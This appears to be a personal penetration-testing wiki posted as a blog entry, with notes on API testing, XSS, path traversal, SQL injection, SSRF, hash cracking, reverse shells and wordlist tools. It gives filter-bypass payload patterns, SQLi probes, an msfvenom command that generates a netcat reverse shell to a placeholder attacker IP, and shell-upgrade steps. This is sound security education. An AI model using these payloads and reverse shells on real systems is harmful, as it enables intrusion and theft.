---
layout: post
title:  "PenTest Wiki"
date:   2023-08-31 16:01:00 +0200
categories: wiki
sticky: true
permalink: /wiki/
---

* TOC
{:toc}

---

## API testing

### Reconnaissance
Before testing APIs, all the **endpoints** should be found. After that, other information that must be known are the **input** that is processed by the API, the **types of requests** it accepts (including compulsory and optional **parameters**), **rate limits** and **authentication**.

#### Documentation
Typically, API are **documented**, therefore, the documentation is the first piece of information that should be checked.

#### Crawling
If documentation isn't available or it is not enough, the API may still be accessible. It is possible to run an automatic process to crawl the API if any **machine-readable documentation** is found, but it is also possible to use specialized tools like **Postman**.

Calls to API may also be present in **JavaScript** files.

#### Fuzzing
After identifying some initial endpoints, hidden ones may be found by **fuzzing** (*i.e.* brute-forcing) other directories. **Wordlists** of common API names are often useful.

### Interacting
Once endpoints are identified, interacting with them enables the investigation of the **API's behaviour**. It can be useful to observe what happens when changing **methods** or **media types**. This can help in constructing a **valid request**.

### Vulnerabilities

#### Mass assignment
**Mass assignment** (or **auto-binding**) happens when request parameters are automatically bound to fields in an internal object. This can result in the unintended support to parameters that were not intended to be supported.

**Hidden parameters** may be revealed by objects returned by the API. When found, sending requests that include such hidden parameters may result in the **application behaving differently**, which may indicate that the parameters can be updated by the user.

#### Server-side parameter pollution
When a website embeds user input in a server-side request to an internal, **non publicly-available** API an attacker may be able to inject parameters which may enable them to **access unauthorized data** or **override existing parameters**.

To test for this vulnerability, characters like **#**, **&** or **=** can be put in the query string and the application's response should be observed.

##### \# character (truncating)
The **URL-encoded #** character (*i.e.* **%23**) would truncate a parameter. An eventual error may reveal **hidden parameters** being used by the endpoint.

##### & character (parameter injection)
The **URL-encoded &** character (*i.e.* **%26**) would add another parameter to the request. If the response is **unchanged** after injecting a parameter, it means that the parameter was successfully **injected** but it was **ignored**.

##### = character (parameter override)
The **=** character, not URL-encoded, can be used in combination with the URL-encoded **&** character to override existing parameters. The impact depends on how the application interprets two parameters with the same name. 

##### REST server-side parameter pollution
In **RESTful API**, parameter names are inserted in the URL path rather than in the query string.

**Path traversal sequences** may be used to test for this vulnerability, as in, visiting **valid/path/../../private/path** may reveal the content of **/private/path**. Once again, the **/** character must be URL-encoded (*i.e.* **%2f**).

##### Server-side parameter pollution in structured data formats
It may be possible to craft a sequence of parameters that would exploit the way the server processes structured data. **Unexpected structured data** should be added as user input and the server's response should be observed.

If data is not sanitized, some characters (such as **"**) could be escaped to form a malicious request.

##### How to prevent
This kind of attacks is usually prevented by **encoding all user input** before making a server-side request.

---

## Cross-site Scripting (XSS)

**Cross-site Scripting (XSS)** is a vulnerability that allows an attacker to bypass the **same origin policy**, which isolates websites from each other. This vulnerability usually allows the attacker to carry out actions that **another user** is able to perform.

This vulnerability is used to manipulate a website so that it returns **JavaScript code** that will be executed on the **victim's machine**. This way the attacker can compromise the **victim's interaction** with the application.

### Reflected XSS

**Reflected XSS** occurs when an application receives data via a **HTTP request** and it includes such data in the response **unsafely**.

The attacker can construct a **malicious URL** and trick the victim into visiting that **URL**. At that point the attacker's script will **execute** in the **victim's browser**.

#### How to detect

Each data entry point (*i.e.* parameters in the **URL** and **message body**, **HTTP headers**) should be tested by submitting **random values** and determining whether the value is **reflected** in the response. After that, submitting a **malicious payload** (alongside the random value for easier detection) and reviewing the response should reveal the vulnerability.

### Stored XSS

**Stored XSS** occurs when an application receives data from an **untrusted source** (*i.e.* **HTTP** request, **SMTP** message, ...) and includes it within later **HTTP responses unsafely**.

#### How to detect

Each data entry point (*i.e.* parameters in the **URL** and **message body**, **HTTP headers**) should be tested by submitting **random values** and determining whether the value appears in an **exit point** (*i.e.* HTTP response). 

### DOM-based XSS

**DOM-based XSS** occurs when an application uses client-side JavaScript to process data from untrusted sources unsafely.

#### How to detect

This vulnerability may be present in **HTML sinks** or **JavaScript execution sinks**. To find vulnerable **HTML sinks** a random value should be put in the source and it should be found somewhere else via **developer tools**. To find vulnerable **JavaScript execution sinks** a debugger should be used.

### Exploiting XSS

#### Cookie stealing



---

## Path traversal
**Path traversal** vulnerabilities enable an attacker to read (or even writing to) arbitrary files. This vulnerability may exist in **URLs** or in the **filename** parameter of a request (such as **image** tags in **HTML** pages).

### Common obstacles
1. Traversal sequences may be blocked and paths may be considered as relative to a default working directory. In this case it may be possible to use an **absolute file path** to access arbitrary files.
2. Sequences such as **../** may be filtered, but this filter can be bypassed by using **nested traversal sequences** such as **....//** as the inner **../** would be stripped, but this would result in the string becoming **../**.
3. Traversal sequences may be stripped before the input is passed to the application, however, **URL-encoding** (even twice) the **../** characters may still be useful. This results in **%2e%2e%2f** and **%252e%252e%252f** respectively. Other (**partial**) encodings, such as **..%252f**, may also work.
4. Applications may require the path to **start** with an **expected folder**. In this case the \"classic\" path traversal should be used.
5. Applications may require the path to **end** with an **expected extension**. In this case the **URL-encoded null byte** (*i.e.* **%00**) would terminate the file path before the required extension.

### How to prevent
This kind of attacks is easily prevented not allowing **APIs** to directly use **user input**. If this is not possible, user input should be **validated** and **appended** to the base directory, and it must be verified that the **canonical path** starts with the expected base directory.

---

## SQL injection
**SQL injection** is a vulnerability that allows to modify the queries an application makes. This can have an impact **confidentiality** and **integrity** of stored data. In some cases a **SQLi** can also **compromise** the underlying infrastructure.

### How to detect
There are several ways to detect injectable parameters:
1. A **single quote** (*i.e.* **\'**) or a **double quote** (*i.e.* **\"**) may cause an error in the query.
2. **Comment characters** (*i.e.* double dashes **\-\-**, or hashtags **\#**) could cause part of the query to be ignored. Remember to **URL-encode** if necessary.
3. Boolean expressions (*e.g.* **OR 1=1**) may change the query's behaviour.
4. Payloads that trigger **time delays** (*e.g.* **SLEEP(x)**) can be leveraged to infer a query's result.

Most **SQLi** vulnerabilities are found in the **WHERE** clause of a **SELECT** query. However, they can also occur in the **WHERE** clause of an **UPDATE** query, in **INSERT** queries or in the **ORDER BY** clause of a **SELECT** query.

An **injectable parameter** may be found anywhere a controllable input is used inside a **SQL query**. This includes:
1. Forms parameters
2. HTTP headers
3. Structured data

### SQLi UNION attack
When an application is vulnerable to **SQLi** and the query's result are shown in the application itself, the **UNION** keyword can be used to retrieve information from **other tables**. However, this attack requires the following conditions:
1. The queries must return the same number of columns.
2. The data types of each column must be compatible.

**Note**: some databases (*e.g.* **Oracle**) may enforce the use of the **FROM** clause for every **SELECT** clause; it is often enough to use a built-in table (**dual** in the case of **Oracle**). Some databases require a **specific syntax**.

#### How many columns?
There are two methods to determine the **number of columns** being returned by the original query:
1. Injecting several **ORDER BY** clauses and incrementing the column index until an **error** occurs (or a **different behaviour** is observed)
2. Injceting a **UNION SELECT** query that specifies a different number of **null values** until an **error** occurs (or a **different behaviour** is observed)

#### What data type?
To find columns whose **data type** is a given type, a **compatible value** must be used instead of **NULL** in the **UNION SELECT attack**. If the column's data type is not compatible the query would result in an **error**. However, if no **error occurs** and the application's response contains **additional content**, the relevant column is suitable to retrieve data of that type.

#### Concatenation
In some cases it may be necessary to retrieve multiple values in a single column. This can be done **concatenating** the values together (such as the **||** operator in **Oracle**), separating them with a special character such as **~**.

### Examining the database
Often it is necessary to know some information about the database in use, such as the **type** and **version** of the database and the **tables** and **columns** it stores.

#### Database version
Both the database and its version can be identified by injecting **database-specific queries**:
* **Microsoft**, **MySQL**: SELECT @@version
* **Oracle**: SELECT * FROM v$version
* **PostgreSQL**: SELECT version()

If the output is not an error it should contain information about the **database version**.

#### Tables and columns
Most databases (except **Oracle**) have **information schema** views tat store information about the database. For example, **information_schema.tables** often contains **table names**, while **information_schema.columns** contains information about columns. This last view can be queried filtering by **table_name**.

### Blind SQLi
A **SQL** injection is said to be **blind** if the application's response **does not contain** any **database error** or the **query's result**.
When the query's output is not visible, **UNION attacks** are not effective at all.

To be able to exploit a blind SQLi vulnerability, a difference in the application's **behaviour** should be observed when submitting different queries.

This vulnerability can occur in **HTTP headers** (such as **cookies**), but also in **forms**.

It is often useful to add a condition that is always **true** (or always **false**) in **AND** to the query.

#### Table names
After finding an injectable parameter, to infer a **table name** it is enough to add **(SELECT 'a' FROM \<TABLE_NAME> LIMIT 1)='a** in **AND**. If the query's result is positive it means that there exists a table named **TABLE_NAME**.

#### Retrieving information
In the case of **string data types**, the **SUBSTRING** function (sometimes called **SUBSTR**) can be used to **guess** a value **one character at a time**.

### Error based SQLi
With this kind of **SQLi** the attacker can use error messages to **extract** or **infer** sensitive data. The application may return a specific error based on the result of a query (this is exploited in the same way of **blind SQLi**).

When the application does not show any **different behaviour** as boolean conditions in the query change, it may still be possible to induce the application to return a **different response** based on whether or not a **SQL error** occurs. A query that causes an error when a given condition is true can be used to disclose sensitive data.

#### CASE statement
Injecting a **CASE** statement that executes an **error-prone branch** (such a **division by 0**) may cause a difference in the application's response. This vector can be used to retrieve data by testing **one character at a time** (like **blind SQLi**).

#### Verbose SQL error messages
A database may provide **error messages** that are too **verbose**. This would provide useful information to an attacker.

The application may be induced to generate an error message containing some **data** returned by a query, making a **blind SQLi** into a visible one. The **CAST()** function enables conversion of data types. As meaningful data is often of **string** type, casting it to an incompatible data type, such as **int**, may cause an error message that **reveals the string** itself.

### Time-based SQLi
If no errors are displayed the application will not show any **different behaviour**. However, it may still be possible to exfiltrate data by triggering time delays depending on the validity of an injected boolean condition.

Time delays are specific to the type of database being used.

### Second-order SQLi
A **second-order SQLi** (or **stored SQLi**) occurs when an application stores user input for future use. The application then retrieves the stored data and uses it unsafely in a **SQL query**.

### How to prevent
Most SQLi instances can be prevented using **parametrized queries** (also known as **prepared statements**) instead of concatenating user input within the query.

However, queries that incorporate user input in the **order by clause** must take a different approach, such as **whitelisting** allowed input values.

Furthermore, user input should be sanitized by escaping characters such as **\'** or **\"** via appropriate functions. User input should also be validated, for example, when taking an email as input it should be in the form of **...@email.com**.

The user querying the database should have minimum permissions.

Finally, a **Web Application Firewall** (**WAF**) would detect malicious inputs and it would reject HTTP requiests containing **SQLi**.


---

## Server-Side Request Forgery (SSRF)
**Server-Side Request Forgery** is a vulnerability that enables an attacker to force the **server-side** application to make requests to an arbitrary location. This vulnerability mainly impacts information's **confidentiality**, but it could also enable an attacker to perform **command execution**.

Usually this vulnerability exploits a a server that has some kind of **trust relationship** with other machines.

A notable use of this vulnerability is the **scanning of live hosts**.

### How to detect
If the application **delegates a request to a server** and the parameter used by the server to make a request can be changed, then the application is **vulnerable**.

### SSRF against back-end systems
If the application is able to communicate with **back-end systems**, these are typically not directly reachable and they may have a weaker **security posture**.

### Common SSRF defenses

#### Blacklist-based input filters
Some input containing sensitive **hostnames** or **URLs** may be **blocked**. This defense can be bypassed using the following techniques:
* Using **alternative IP representations** (this can be done with **sipcalc**).
* Registering a **domain name** that resolves to a specific address.
* **URL-encode** (even **twice**) blocked strings.
* Provide an **attacker-controlled URL** that redirects to the target **URL**.

#### Whitelist-based input filters
Input may be allowed only if it matches any entry in a **whitelist**. The filter may look for a match contained in the input or at its beginning. This defense can be bypassed by exploiting **inconsistent URL parsing**:
* **credentials** can be embedded in a **URL** using a **@** character before the hostname (*e.g.* **https://expected-host:fakepassword@evil-host**).
* The **#** character may be used to indicate a fragment (*e.g.* **https://evil-host#expected-host**).
* Characters can be **URL-encoded** (even **twice**).
* A combination of these techniques.

#### Open redirection
Sometimes filter-based defenses can be bypassed by exploiting an **open redirection vulnerability**.

This vulnerability occurs when an application unsafely incorporates **user controllable data** into the target of a **redirection**.

### Blind SSRF
This kind of vulnerability occurs when the attacker can force an application to make a **back-end request** to an arbitrary **URL**, but the back-end's response is **not returned** to the application's **front-end**.

#### How to detect
**Blind SSRFs** vulnerabilities are usually detected using **out-of-band techniques** (**OAST**). This would mean forcing the server to make a request to an **attacker-controlled URL**. If an incoming request from the application is observed, it means it is vulnerable.

### Partial URLs
An application may use a **hostname** or **part of a URL** in request parameters. The value is then incorporated into a full **URL** that is requested.

### URLs in data formats
An application may transmit data in formats that allow the inclusion of **URLs** that may be requested by the **data parser** itself.

### Referer header
An application may use analytics software to track visitors. This software often logs the requests' **referer header** and often visits any **URLs** that appear in this header.

---

## Hashes

### Hash identification
[Haiti](https://noraj.github.io/haiti/) is a hash identifier that is available both as a CLI tool and as a library that also supports Hashcat and John The Ripper.

**Usage**: haiti \[options\] \<hashes>

Here are some useful options:
* **-e**, **\-\-extended**: lists all possible hash algorithms including salted ones
* **\-\-short**: does not display Hashcat or John The Ripper references

### Hash cracking

#### Hashcat
Hashcat is a tool for cracking hashes.

##### Usage
hashcat \[OPTIONS\] \<hash, hashfile> \[wordlist\]

##### Useful options
* **-a ATTACK_MODE**: specifies an attack mode
* **-m HASH_TYPE**: specifies a hash type

#### John The Ripper
John the Ripper is a tool for cracking hashes.

##### Usage
john \[OPTIONS\] \[PASSWORD-FILES\]

##### Useful options

* **\-\-wordlist=/path/to/wordlist**: specifies a wordlist file
* **\-\-rules=RULESET_NAME**: specifies a set of rules to use while cracking
* **\-\-format=HASH_TYPE**: specifies the type of the hash

---

## Reverse shell

A **reverse shell** is a shell connection from the target machine to the attacker machine.

### Reverse shell generation

It is possible to use **msfvenom** to generate appropriate one-liner commands. The following command lists all the available payloads, filters the ones that are not **cmd/unix** and prints only their name:

{% highlight bash%}

msfvenom -l payloads | grep "cmd/unix" | awk {'print $1'}

{% endhighlight %}

These payloads can be used to generate the needed command. For example, the following command will generate a one-liner netcat command for the specified parameters

{% highlight bash%}

msfvenom -p cmd/unix/reverse_netcat LHOST=1.2.3.4 LPORT=4444

{% endhighlight %}

The reverse shells must be caught on the attacker machine by listening on the specified port (**nc -lvnp 4444**).

### Upgrading a dumb shell to a fully interactive shell

Reverse shells are usually lacking core functionalities such as no tab-complete, no command history with the up arrow, and the inability to use some commands (**su**, **ssh**, text editors).

However, it is possible to upgrade these shells to fully interactive ones. Running the following command will spawn a pseudo-terminal that can help when running some commands:

{% highlight bash %}

python -c 'import pty; pty.spawn("/bin/bash")'

{% endhighlight %}

Then, some options must be set in the attacking machine's terminal. After starting the pseudo-shell with Python, background it with **CTRL + Z**. Then, some information about the terminal must be known:
* the **TERM** type can be printed with **echo $TERM**
* the size of the **TTY** can be printed (along with other information) with **stty -a**.

After that, the **STTY** type can be set to **raw** and the shell can be foregrounded with **stty raw -echo; fg**. Then some variables must be set. Assuming that **TERM=xterm256-color** and the **STTY rows** and **columns** are respectively **38** and **116**:
* **export SHELL=bash**
* **export TERM=xterm256-color**
* **stty rows 38 columns 116**

If necessary, run **reset** to have a properly functional shell.
#### TL;DR

1. python -c \'import pty; pty.spawn(\"/bin/bash\")\'
2. CTRL + Z
3. echo $TERM (assume it echoes **X**)
4. stty -a (assume it echoes rows **Y**; columns **Z**)
5. stty raw -echo; fg
6. export SHELL=bash
7. export TERM=**X**
8. stty rows **Y** columns **Z**
9. reset (**optional**)

---

## Wordlists

### Wordlistctl

[Wordlistctl](https://github.com/BlackArch/wordlistctl) is a script that allows to easily install wordlists.

#### Installation

To install on non-Arch systems:

{% highlight bash %}

mkdir wordlistctl && cd wordlistctl
curl https://raw.githubusercontent.com/BlackArch/wordlistctl/master/requirements.txt > requirements.txt
curl https://raw.githubusercontent.com/BlackArch/wordlistctl/master/repo.json > repo.json
curl https://raw.githubusercontent.com/BlackArch/wordlistctl/master/wordlistctl.py > wordlistctl
pip3 install -r requirements.txt
chmod +x wordlistctl
{% endhighlight %}

#### Usage

wordlistctl \<fetch, search, list> \<wordlist>

* **search**: searches for a wordlist by name
* **fetch**: installs a wordlist by name
* **list**: prints wordlists names

#### Useful flags:
* **-g** \<category>: downloads (when used with **fetch**) or prints (when used with **list**) *category* wordlists names (*e.g.* **wordlistctl list -g usernames** prints names of the wordlists that can be used to crack usernames)

### Mentalist

[Mentalist](https://github.com/sc0tfree/mentalist) is a tool for wordlist generation that can be used to expand an already existing wordlist.

It has a **GUI** which allows to easily add **Case**, **Substitution** and **Append/Prepend** rules.

### CEWL
[CeWL](https://github.com/digininja/CeWL) is a tool that spiders a given URL and returns a list of words that can be used with password crackers.

#### Usage

cewl \[OPTIONS\] \<URL>

#### Useful flags:
* **-d <DEPTH>**: specifies a depth for spidering
* **-m \-\-min_word_length MIN_WORD_LENGTH**: specifies the minimum word length
* **-x, \-\-max_word_length MAX_WORD_LENGTH**: specifies the maximum word length
* **-o, \-\-offsite**: allows the spider to visit other websites
* **-w, \-\-write FILENAME**: writes the output to a file

### Ttpassgen
[ttpassgen](https://github.com/tp7309/TTPassGen) is a tool for wordlist generation.

#### Usage

ttpassgen [OPTIONS] OUTPUT

#### Useful flags:

* **-m, \-\-mode MODE_NUMBER**: specifies the generation mode
* **-d, \-\-dictlist WORDLIST**: read wordlists from files
* **-r, \-\-rule RULES**: allows for rule specification, also referring to previously specified wordlist files